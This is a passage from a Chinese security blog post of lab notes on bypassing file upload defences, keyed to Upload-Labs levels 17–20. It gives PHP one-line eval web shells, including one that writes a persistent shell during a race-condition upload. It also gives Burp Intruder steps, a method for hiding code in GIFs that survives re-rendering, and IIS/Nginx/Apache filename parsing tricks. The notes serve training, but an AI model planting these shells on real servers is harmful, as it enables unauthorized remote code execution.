+<li><p><strong>核心特征</strong>：文件上传成功后瞬间被删除，无法正常访问。</p>
+</li>
+<li><p><strong>绕过方法</strong>：Burp Suite 多线程并发上传，同时高频访问文件路径，抢在删除前执行。</p>
+<p><img src="/images/notes/media_upload/media/image15.jpeg" srcset="/img/loading.gif" lazyload alt="e59a6e0b151bb7fef5e8450223723032"></p>
+<p>竞争上传的木马内容（在临时文件被删除前执行，生成一个新的持久化木马）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>具体操作步骤：</strong></p>
+<ol>
+<li><strong>抓包</strong>：用 Burp Suite 抓取上传请求，右键发送到 Intruder（攻击模块）。</li>
+<li><strong>标记变量</strong>：在文件名 <code>.php</code> 后面加上 <code>1</code>（如 <code>shell.php1</code>），选中 <code>1</code>，点击”Add §”标注为变量。</li>
+<li><strong>设置 Payload</strong>：在 Payloads 选项卡中，Payload type 选择 <strong>Null payloads</strong>（空载荷，即不修改变量，保持原样无限重发）。</li>
+<li><strong>配置线程</strong>：在 Options 中设置较高线程数（如 20-50），加快并发速度。</li>
+<li><strong>开始攻击</strong>：点击 <strong>Start attack</strong>，Intruder 会持续并发发送上传请求。</li>
+<li><strong>同时访问</strong>：攻击发起后，同时在浏览器或用另一个 Intruder 持续高频访问 <code>shell.php</code>，抢在服务器删除临时文件之前触发执行，生成持久化木马。</li>
+</ol>
+</li>
+<li><p><strong>靶场对应</strong>：Upload-Labs Pass-17</p>
+</li>
+<li><p><strong>备注</strong>：考验并发操作，需持续发包抢占执行时机。</p>
+</li>
+</ul>
+<h4 id="图片二次渲染漏洞"><a href="#图片二次渲染漏洞" class="headerlink" title="图片二次渲染漏洞"></a>图片二次渲染漏洞</h4><ul>
+<li><p><strong>防护原理</strong>：服务器对上传图片重新压缩、裁剪、生成，清除插入的恶意代码。</p>
+</li>
+<li><p><strong>核心特征</strong>：可上传图片马，但打开后木马代码丢失，图片被修改。</p>
+</li>
+<li><p><strong>绕过方法</strong>：在图片非渲染区域插入代码（PNG 数据块、GIF 帧间隙、EXIF 信息），例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a;<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br>图片像素数据<br></code></pre></td></tr></table></figure>
+
+<p><strong>GIF 图片马二次渲染绕过步骤：</strong></p>
+<p>由于服务器二次渲染会清除恶意代码，需要找到渲染后<strong>未被修改的区域</strong>插入木马。以 GIF 为例：</p>
+<ol>
+<li><strong>制作 GIF 图片马</strong>：先制作一个基础的 GIF 图片马（图片 + 一句话木马）。</li>
+<li><strong>上传图片马</strong>：将图片马上传到关卡中，服务器会对它进行二次渲染。</li>
+<li><strong>另存渲染后的图片</strong>：将服务器渲染后返回的图片<strong>另存</strong>到本地——这就是被二次渲染后的版本，从中可以对比找出哪些区域未被修改。</li>
+<li><strong>用 010 Editor 打开</strong>：将另存的 GIF 图片马上传至 <strong>010 Editor</strong>（十六进制编辑器），查看文件的二进制结构。</li>
+<li><strong>插入木马</strong>：在<strong>最后一列</strong>（文件末尾的数据区域）找一个靠上的位置插入一句话木马代码。选择靠上的位置是因为二次渲染通常从文件头部开始处理，末尾靠上的区域更可能未被修改。</li>
+<li><strong>重新上传</strong>：保存修改后的 GIF 文件并重新上传，此时木马代码位于渲染未触及的区域，能够保留下来，配合文件包含漏洞即可执行。</li>
+</ol>
+<blockquote>
+<p><strong>注：</strong> 关键在于对比上传前后的图片，找到二次渲染<strong>未修改的区域</strong>。不同格式（GIF&#x2F;PNG&#x2F;JPG）的渲染区域不同，需分别分析。GIF 通常在帧数据间隙有可利用空间。</p>
+</blockquote>
+</li>
+<li><p><strong>靶场对应</strong>：Upload-Labs Pass-18</p>
+</li>
+<li><p><strong>备注</strong>：难度较高，需精准找到图片未被修改的区域。</p>
+</li>
+</ul>
+<h4 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h4><ul>
+<li><p><strong>防护原理</strong>：Web 服务器（IIS&#x2F;Nginx&#x2F;Apache）自身解析规则缺陷，非脚本后缀可被解析。</p>
+</li>
+<li><p><strong>核心特征</strong>：上传正常图片文件，构造特殊文件名&#x2F;路径可执行脚本。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>中间件</th>
+<th>绕过方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IIS 6.0</td>
+<td><code>shell.asp;.jpg</code>、<code>/shell.asp/1.jpg</code></td>
+</tr>
+<tr>
+<td>Nginx&#x2F;IIS 7.5</td>
+<td><code>shell.jpg/.php</code></td>
+</tr>
+<tr>
+<td>Apache</td>
+<td><code>shell.php.xxx</code>（多后缀解析，从右往左解析直到遇到可识别后缀）</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>靶场对应</strong>：Upload-Labs Pass-19&#x2F;20</p>
+</li>
+<li><p><strong>备注</strong>：不属于代码漏洞，是中间件自身缺陷，实战中高频利用。</p>
+</li>
+</ul>
+<h2 id="四、速查使用技巧"><a href="#四、速查使用技巧" class="headerlink" title="四、速查使用技巧"></a>四、速查使用技巧</h2><ol>
+<li><p>做题时先看<strong>拦截特征</strong>（如抓包查看、数据回显上传成功等），对应表格找漏洞类型，再用对应绕过方法。</p>
+</li>
+<li><p>实战中先测试前端、MIME、黑名单，再测试白名单、内容检测，最后尝试中间件漏洞。上传木马后务必确认<strong>上传路径</strong>，无路径则无法执行木马。</p>
+</li>
+<li><p>上传成功后，想要 getshell 必须满足：文件能正常被访问到，且文件能被服务器当做脚本解析并运行。</p>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="category-chain-item">安全笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件上传漏洞</div>
+      <div>https://chiya-66.github.io/2026/08/10/upload/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年8月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/09/09/%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" title="实验：内网隧道搭建">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">实验：内网隧道搭建</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/08/08/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/" title="解析漏洞与编辑器漏洞">
+                        <span class="hidden-mobile">解析漏洞与编辑器漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
